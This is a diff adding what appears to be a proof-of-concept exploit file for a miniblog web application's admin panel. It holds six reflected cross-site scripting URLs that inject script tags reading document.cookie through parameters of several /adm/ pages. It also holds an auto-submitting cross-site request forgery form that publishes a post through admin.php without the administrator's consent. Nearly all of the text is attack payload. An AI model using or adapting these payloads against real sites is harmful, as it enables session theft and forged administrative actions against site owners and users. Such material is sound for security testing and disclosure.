@@ -1,0 +1,24 @@
+http://www.example.com/adm/list.php?post_list=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/login.php?error_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/options.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/password.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+http://www.example.com/adm/edit.php?response_text=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/adm/edit.php?mode=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+
+
+&lt;form action=&quot;http://www.example.com/adm/admin.php?mode=add&amp;id=&quot; method=&quot;post&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;data[post_title]&quot; value=&quot;csrf&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;data[post_content]&quot; value=&quot;csrf&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;data[published]&quot; value=&quot;1&quot;&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;miniblog_PostBack&quot; value=&quot;Add&quot;&gt;
+&lt;input type=&quot;submit&quot; id=&quot;btn&quot;&gt;
+&lt;/form&gt;
+&lt;script&gt;
+document.getElementById(&#039;btn&#039;).click();
+&lt;/script&gt;
+
+
